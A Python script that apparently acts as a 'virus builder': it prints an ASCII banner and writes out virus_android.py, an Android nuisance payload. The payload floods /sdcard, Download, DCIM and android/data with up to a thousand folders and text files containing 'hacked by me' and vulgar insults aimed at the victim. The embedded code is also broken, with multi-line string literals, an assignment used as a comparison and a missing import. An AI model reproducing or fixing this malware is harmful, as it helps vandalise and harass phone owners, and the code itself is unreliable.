import os , time
from colorama import Fore as c
def pr(txt):
    for x in txt:
        print(x, end='', flush=True)  
        time.sleep(0.01)
def txt():
    if os.name == 'nt':
        
            os.system('cls')
    else:
            os.system('clear') 
    pr(c.YELLOW+'''
           
    ┌─┐┬  ┌─┐  ┌─┐┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬   ┌─┐┬ ┬┌┐ ┌─┐┬─┐
    ├┤ │  ├┤   └─┐├┤ │  │ │├┬┘│ │ └┬┘   │  └┬┘├┴┐├┤ ├┬┘
    └─┘┴─┘└────└─┘└─┘└─┘└─┘┴└─┴ ┴  ┴────└─┘ ┴ └─┘└─┘┴└─
    \n''')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    try:
        os.chdir('output')
    except:
        pass
    file = open('virus_android.py' , 'w+')
    virus = '''
for i in range(1000):
    try:
        os.chdir('/sdcard/android')
    except:
        os.chdir('/sdcard')
        c = str(i)
        os.makedirs(c)
        os.chdir(c)
        f = open(c+".txt", "w+")
        for g in range(10):
            f.write("[-]hacked by me "+'
'+"
 YOUR FAMILY FUCKED")

        if c == '999':
          break
for i in range(1000):          
        os.chdir('/sdcard')
        
        c = str(i)
        os.makedirs(c)
        os.chdir(c)
        f = open(c+".txt", "w+")

        for g in range(10):
            f.write("[-]hacked by me")

            g = open("look_at_me.txt","w+")
            for i in range(1):
                g.write("[-]bye baby")



        if c == '999':
          
            break


for i in range(100):
    try:
        os.chdir('/sdcard/download')
    except:
        os.chdir('/sdcard/Download')
        c = str(i)
        os.makedirs(c)
        os.chdir(c)
        f = open(c+".txt", "w+")

        for g in range(10):
            f.write("[-]hacked by me ")

            g = open("look_at_me.txt","w+")
            for i in range(1):
                g.write("[-]fuck your mather")



        if c == '999':
          break 
for i in range(1000):        
        os.chdir('/sdcard/DCIM')
        
        c = str(i)
        os.makedirs(c)
        os.chdir(c)
        f = open(c+".txt", "w+")

        for g in range(10):
            f.write("[-]hacked by me ")

            g = open("look_at_me.txt","w+")
            for i in range(1):
                g.write("[-]YOU ARE SISTER FUCKER")



        if c == '999':
            
          break  

for i in range(1000):
    try:
        os.chdir('/sdcard/android/data')
    except:
        os.chdir('/sdcard')
        g = str(i)
        c = str(g)
        os.makedirs(c)
        os.chdir(c)
        f = open(c+".txt", "w+")

        for g in range(10):
            f.write("[-]hacked by me "+'
'+"
 FUCK YOU")

            g = open("look_at_me.txt","w+")
            for i in range(1):
                g.write("[-]YOU ARE BITCH")
        if c = '999':
            break

'''
    
    file.write(virus)
    pr(f"{c.WHITE}root&@elf:~# {c.GREEN}The file was created")
    time.sleep(5)
    if os.name == 'nt':
    
        os.system('cls')
    else:
        os.system('clear')
